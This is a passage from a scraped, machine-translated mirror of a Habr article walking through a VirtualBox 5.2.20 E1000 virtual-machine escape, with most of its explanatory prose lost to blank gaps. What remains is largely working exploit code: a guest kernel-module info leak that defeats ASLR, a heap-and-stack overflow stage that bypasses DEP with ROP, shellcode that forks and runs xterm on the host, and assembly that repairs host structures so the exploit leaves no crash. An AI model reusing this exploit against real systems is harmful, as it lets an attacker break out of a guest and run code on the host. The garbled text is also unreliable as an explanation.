class="hljs-number">.20</span></span>/out/linux.amd64/release/bin/VBoxDD.so <span class="hljs-number"><span class="hljs-number">0x00007fc44d</span></span>768000 <span class="hljs-number"><span class="hljs-number">0x00007fc44d</span></span>968000 <span class="hljs-number"><span class="hljs-number">0x0000000000275000</span></span> --- /home/user/src/VirtualBox<span class="hljs-number"><span class="hljs-number">-5.2</span></span><span class="hljs-number"><span class="hljs-number">.20</span></span>/out/linux.amd64/release/bin/VBoxDD.so <span class="hljs-number"><span class="hljs-number">0x00007fc44d</span></span>968000 <span class="hljs-number"><span class="hljs-number">0x00007fc44d</span></span>977000 <span class="hljs-number"><span class="hljs-number">0x0000000000275000</span></span> r-- /home/user/src/VirtualBox<span class="hljs-number"><span class="hljs-number">-5.2</span></span><span class="hljs-number"><span class="hljs-number">.20</span></span>/out/linux.amd64/release/bin/VBoxDD.so <span class="hljs-number"><span class="hljs-number">0x00007fc44d</span></span>977000 <span class="hljs-number"><span class="hljs-number">0x00007fc44d</span></span>980000 <span class="hljs-number"><span class="hljs-number">0x0000000000284000</span></span> rw- /home/user/src/VirtualBox<span class="hljs-number"><span class="hljs-number">-5.2</span></span><span class="hljs-number"><span class="hljs-number">.20</span></span>/out/linux.amd64/release/bin/VBoxDD.so gef‚û§ p <span class="hljs-number"><span class="hljs-number">0x00007fc44d6ecd</span></span>c6 - <span class="hljs-number"><span class="hljs-number">0x00007fc44d4f</span></span>3000 $<span class="hljs-number"><span class="hljs-number">2</span></span> = <span class="hljs-number"><span class="hljs-number">0x1f9d</span></span>c6</code> </pre> <br><p> ,   0x58    ACPIState    ,     RVA   VBoxDD.so.              ,     VBoxDD.so     ASLR. ,     ,    ,      ACPIState        .  ,    ,   0x58   ACPIState    . </p><br><h4 id="information-leak"> Information Leak </h4><br><p>             ASLR.   ,   EEPROM93C46,    EEPROM      ACPIState,      INB(0x4107)    ACPI     .     ,      . </p><br><pre> <code class="hljs pgsql">uint64_t stage_1_main(<span class="hljs-type"><span class="hljs-type">void</span></span>* mmio, <span class="hljs-type"><span class="hljs-type">void</span></span>* tx_ring) { printk(KERN_INFO PFX"##### Stage 1 #####\n"); // <span class="hljs-keyword"><span class="hljs-keyword">When</span></span> loopback mode <span class="hljs-keyword"><span class="hljs-keyword">is</span></span> enabled data (network packets actually) <span class="hljs-keyword"><span class="hljs-keyword">of</span></span> every Tx Data Descriptor // <span class="hljs-keyword"><span class="hljs-keyword">is</span></span> sent back <span class="hljs-keyword"><span class="hljs-keyword">to</span></span> the guest <span class="hljs-keyword"><span class="hljs-keyword">and</span></span> handled right now via e1kHandleRxPacket. // <span class="hljs-keyword"><span class="hljs-keyword">When</span></span> loopback mode <span class="hljs-keyword"><span class="hljs-keyword">is</span></span> disabled data <span class="hljs-keyword"><span class="hljs-keyword">is</span></span> sent <span class="hljs-keyword"><span class="hljs-keyword">to</span></span> a network <span class="hljs-keyword"><span class="hljs-keyword">as</span></span> usual. // We <span class="hljs-keyword"><span class="hljs-keyword">disable</span></span> loopback mode here, at Stage <span class="hljs-number"><span class="hljs-number">1</span></span>, <span class="hljs-keyword"><span class="hljs-keyword">to</span></span> overflow the heap but <span class="hljs-keyword"><span class="hljs-keyword">not</span></span> touch the stack buffer // <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> e1kHandleRxPacket. Later, at Stage <span class="hljs-number"><span class="hljs-number">2</span></span> we <span class="hljs-keyword"><span class="hljs-keyword">enable</span></span> loopback mode <span class="hljs-keyword"><span class="hljs-keyword">to</span></span> overflow heap <span class="hljs-keyword"><span class="hljs-keyword">and</span></span> // the stack buffer. e1000_disable_loopback_mode(mmio); uint8_t leaked_bytes[<span class="hljs-number"><span class="hljs-number">8</span></span>]; uint32_t i; <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> (i = <span class="hljs-number"><span class="hljs-number">0</span></span>; i &lt; <span class="hljs-number"><span class="hljs-number">8</span></span>; i++) { stage_1_overflow_heap_buffer(mmio, tx_ring, i); leaked_bytes[i] = stage_1_leak_byte(); printk(KERN_INFO PFX"Byte %d leaked: 0x%02X\n", i, leaked_bytes[i]); } uint64_t leaked_vboxdd_ptr = *(uint64_t*)leaked_bytes; uint64_t vboxdd_base = leaked_vboxdd_ptr - LEAKED_VBOXDD_RVA; printk(KERN_INFO PFX"Leaked VBoxDD.so pointer: 0x%016llx\n", leaked_vboxdd_ptr); printk(KERN_INFO PFX"Leaked VBoxDD.so base: 0x%016llx\n", vboxdd_base); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> vboxdd_base; }</code> </pre> <br><p>    ,  ,   integer underflow    stack buffer overflow,      E1000.   ,      e1kHandleRxPacket,     Tx-  ,   loopback-.   :        ,       .    ,   e1kHandleRxPacket  . </p><br><h3 id="obhod-dep">  DEP </h3><br><p>   ASLR.    loopback-    stack buffer overflow. </p><br><pre> <code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">void</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">stage_2_overflow_heap_and_stack_buffers</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(</span></span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">void</span></span></span></span><span class="hljs-function"><span class="hljs-params">* mmio, </span></span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">void</span></span></span></span><span class="hljs-function"><span class="hljs-params">* tx_ring, </span></span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">uint64_t</span></span></span></span><span class="hljs-function"><span class="hljs-params"> vboxdd_base)</span></span></span><span class="hljs-function"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">off_t</span></span> buffer_pa; <span class="hljs-keyword"><span class="hljs-keyword">void</span></span>* buffer_va; alloc_buffer(&amp;buffer_pa, &amp;buffer_va); stage_2_set_up_buffer(buffer_va, vboxdd_base); stage_2_trigger_overflow(mmio, tx_ring, buffer_pa); free_buffer(buffer_va); } <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">void</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">stage_2_main</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(</span></span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">void</span></span></span></span><span class="hljs-function"><span class="hljs-params">* mmio, </span></span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">void</span></span></span></span><span class="hljs-function"><span class="hljs-params">* tx_ring, </span></span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">uint64_t</span></span></span></span><span class="hljs-function"><span class="hljs-params"> vboxdd_base)</span></span></span><span class="hljs-function"> </span></span>{ printk(KERN_INFO PFX<span class="hljs-string"><span class="hljs-string">"##### Stage 2 #####\n"</span></span>); e1000_enable_loopback_mode(mmio); stage_2_overflow_heap_and_stack_buffers(mmio, tx_ring, vboxdd_base); e1000_disable_loopback_mode(mmio); }</code> </pre> <br><p> ,        e1kHandleRxPacket,     ,      ,   .   DEP    .       ROP-,    ,        . </p><br><h3 id="shellkod">  </h3><br><p>    .    ,   ,     .          ROP-,    ‚Äî  . </p><br><pre> <code class="hljs pgsql">use64 <span class="hljs-keyword"><span class="hljs-keyword">start</span></span>: lea rsi, [rsp - <span class="hljs-number"><span class="hljs-number">0x4170</span></span>]; push rax pop rdi <span class="hljs-keyword"><span class="hljs-keyword">add</span></span> rdi, loader_size mov rcx, <span class="hljs-number"><span class="hljs-number">0x800</span></span> rep movsb nop payload: ; Here the shellcode <span class="hljs-keyword"><span class="hljs-keyword">is</span></span> <span class="hljs-keyword"><span class="hljs-keyword">to</span></span> be loader_size = $ - <span class="hljs-keyword"><span class="hljs-keyword">start</span></span></code> </pre> <br><p>    .    : </p><br><pre> <code class="hljs nginx"><span class="hljs-attribute"><span class="hljs-attribute">use64</span></span> start: ; <span class="hljs-attribute"><span class="hljs-attribute">sys_fork</span></span> mov rax, <span class="hljs-number"><span class="hljs-number">58</span></span> syscall test rax, rax jnz continue_process_execution ; <span class="hljs-attribute"><span class="hljs-attribute">Initialize</span></span> argv lea rsi, [cmd] mov [argv], rsi ; <span class="hljs-attribute"><span class="hljs-attribute">Initialize</span></span> envp lea rsi, [env] mov [envp], rsi ; <span class="hljs-attribute"><span class="hljs-attribute">sys_execve</span></span> lea rdi, [cmd] lea rsi, [argv] lea rdx, [envp] mov rax, <span class="hljs-number"><span class="hljs-number">59</span></span> syscall ... cmd db <span class="hljs-string"><span class="hljs-string">'/usr/bin/xterm'</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span> env db <span class="hljs-string"><span class="hljs-string">'DISPLAY=:0.0'</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span> argv dq <span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span> envp dq <span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span></code> </pre> <br><p>  fork  execve,     /usr/bin/xtem.        ring 3. </p><br><h3 id="process-continuation"> Process Continuation </h3><br><p>  ,        .  ,      ,  ,     .  ,      ,     . </p><br><pre> <code class="hljs vhdl">continue_process_execution: ; Restore RBP mov rbp, rsp add rbp, <span class="hljs-number"><span class="hljs-number">0</span></span>x48 ; Skip junk add rsp, <span class="hljs-number"><span class="hljs-number">0</span></span>x10 ; Restore the registers that must be preserved according <span class="hljs-keyword"><span class="hljs-keyword">to</span></span> System V ABI pop rbx pop r12 pop r13 pop r14 pop r15 ; Skip junk add rsp, <span class="hljs-number"><span class="hljs-number">0</span></span>x8 ; Fix the linked list <span class="hljs-keyword"><span class="hljs-keyword">of</span></span> PDMQUEUE <span class="hljs-keyword"><span class="hljs-keyword">to</span></span> prevent segfaults <span class="hljs-keyword"><span class="hljs-keyword">on</span></span> VM shutdown ; Before: <span class="hljs-string"><span class="hljs-string">"E1000-Xmit"</span></span> -&gt; <span class="hljs-string"><span class="hljs-string">"E1000-Rcv"</span></span> -&gt; <span class="hljs-string"><span class="hljs-string">"Mouse_1"</span></span> -&gt; <span class="hljs-keyword"><span class="hljs-keyword">NULL</span></span> ; <span class="hljs-keyword"><span class="hljs-keyword">After</span></span>: <span class="hljs-string"><span class="hljs-string">"E1000-Xmit"</span></span> -&gt; <span class="hljs-keyword"><span class="hljs-keyword">NULL</span></span> ; Zero <span class="hljs-keyword"><span class="hljs-keyword">out</span></span> the entire PDMQUEUE <span class="hljs-string"><span class="hljs-string">"Mouse_1"</span></span> pointed by <span class="hljs-string"><span class="hljs-string">"E1000-Rcv"</span></span> ; This was unnecessary <span class="hljs-keyword"><span class="hljs-keyword">on</span></span> my testing machines but <span class="hljs-keyword"><span class="hljs-keyword">to</span></span> be sure... mov rdi, [rbx] mov rax, <span class="hljs-number"><span class="hljs-number">0</span></span>x0 mov rcx, <span class="hljs-number"><span class="hljs-number">0</span></span>xA0 rep stosb ; <span class="hljs-keyword"><span class="hljs-keyword">NULL</span></span> <span class="hljs-keyword"><span class="hljs-keyword">out</span></span> a pointer <span class="hljs-keyword"><span class="hljs-keyword">to</span></span> PDMQUEUE <span class="hljs-string"><span class="hljs-string">"E1000-Rcv"</span></span> stored <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> <span class="hljs-string"><span class="hljs-string">"E1000-Xmit"</span></span> ; because the first <span class="hljs-number"><span class="hljs-number">8</span></span> bytes <span class="hljs-keyword"><span class="hljs-keyword">of</span></span> <span class="hljs-string"><span class="hljs-string">"E1000-Rcv"</span></span> (a pointer <span class="hljs-keyword"><span class="hljs-keyword">to</span></span> <span class="hljs-string"><span class="hljs-string">"Mouse_1"</span></span>) ; will be corrupted <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> MMHyperFree mov qword [rbx], <span class="hljs-number"><span class="hljs-number">0</span></span>x0 ; Now the last PDMQUEUE <span class="hljs-keyword"><span class="hljs-keyword">is</span></span> <span class="hljs-string"><span class="hljs-string">"E1000-Xmit"</span></span> which will <span class="hljs-keyword"><span class="hljs-keyword">not</span></span> be corrupted ret</code> </pre> <br><p>   ,          ,         e1kHandleRxPacket.    ,     ,    ROP-,   ,    :        ,       . <br>       e1kHandleRxPacket  : </p><br><pre> <code class="hljs css"><span class="hljs-selector-id"><span class="hljs-selector-id">#0</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">e1kHandleRxPacket</span></span> <span class="hljs-selector-id"><span class="hljs-selector-id">#1</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">e1kTransmitFrame</span></span> <span class="hljs-selector-id"><span class="hljs-selector-id">#2</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">e1kXmitDesc</span></span> <span class="hljs-selector-id"><span class="hljs-selector-id">#3</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">e1kXmitPacket</span></span> <span class="hljs-selector-id"><span class="hljs-selector-id">#4</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">e1kXmitPending</span></span> <span class="hljs-selector-id"><span class="hljs-selector-id">#5</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">e1kR3NetworkDown_XmitPending</span></span> ...</code> </pre> <br><p>       e1kR3NetworkDown_XmitPending,            : </p><br><pre> <code class="hljs cs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">static</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">DECLCALLBACK</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">void</span></span></span></span></span><span class="hljs-function">) </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">e1kR3NetworkDown_XmitPending</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">PPDMINETWORKDOWN pInterface</span></span></span><span class="hljs-function">)</span></span> { PE1KSTATE pThis = RT_FROM_MEMBER(pInterface, E1KSTATE, INetworkDown); <span class="hljs-comment"><span class="hljs-comment">/* Resume suspended transmission */</span></span> STATUS &amp;= ~STATUS_TXOFF; e1kXmitPending(pThis, <span class="hljs-literal"><span class="hljs-literal">true</span></span> <span class="hljs-comment"><span class="hljs-comment">/*fOnWorkerThread*/</span></span>); }</code> </pre> <br><p>   0x48   RBP,    ,      e1kR3NetworkDown_XmitPending.      RBX, R12, R13, R14  R15, ..    System V ABI       .    ,   -     . </p><br><p>       ‚Äî         .     ,  access violation  PDMR3QueueDestroyDevice.    ,         PDMQUEUE,        ROP-, ..  16   .       ROP-,             .  ,      . </p><br><p>  ,   ‚Äî  .      ,     .      : </p><br><pre> <code class="hljs pgsql">; Fix the linked list <span class="hljs-keyword"><span class="hljs-keyword">of</span></span> PDMQUEUE <span class="hljs-keyword"><span class="hljs-keyword">to</span></span> prevent segfaults <span class="hljs-keyword"><span class="hljs-keyword">on</span></span> VM shutdown ; <span class="hljs-keyword"><span class="hljs-keyword">Before</span></span>: "E1000-Xmit" -&gt; "E1000-Rcv" -&gt; "Mouse_1" -&gt; <span class="hljs-keyword"><span class="hljs-keyword">NULL</span></span> ; <span class="hljs-keyword"><span class="hljs-keyword">After</span></span>: "E1000-Xmit" -&gt; <span class="hljs-keyword"><span class="hljs-keyword">NULL</span></span></code> </pre> <br><p>     ,     . </p><br><h2 id="demo">  </h2><br><iframe width="560" height="315" src="https://www.youtube.com/embed/.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u=https://player.vimeo.com/video/299325088" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></div>
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
    <p>Source: <a href="https://habr.com/ru/post/429004/">https://habr.com/ru/post/429004/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../428992/index.html">Selective bypass blocking on routers with Padavan and Keenetic OS firmware</a></li>
<li><a href="../428994/index.html">Networking on Android using Corutin and Retrofit</a></li>
<li><a href="../428996/index.html">Club of anonymous Santa Clauses 2018-2019 in Habrahabr</a></li>
<li><a href="../428998/index.html">How to use the new experimental Profiler feature in React</a></li>
<li><a href="../429000/index.html">Why did Bill Gates invent a $ 233 billion toilet</a></li>
<li><a href="../429006/index.html">China: "World Assembly Workshop" is not as simple as it seems</a></li>
<li><a href="../429008/index.html">Alpha Zero, chess and learning English: the present and the future of artificial intelligence</a></li>
<li><a href="../429010/index.html">Playing tickets to the workshop "Advanced React State Management With MobX"</a></li>
<li><a href="../429012/index.html">Megafon sues Hewlett-Packard for buggy software that was left unattended by subscribers in Moscow</a></li>
<li><a href="../429014/index.html">Git subtree in detail</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>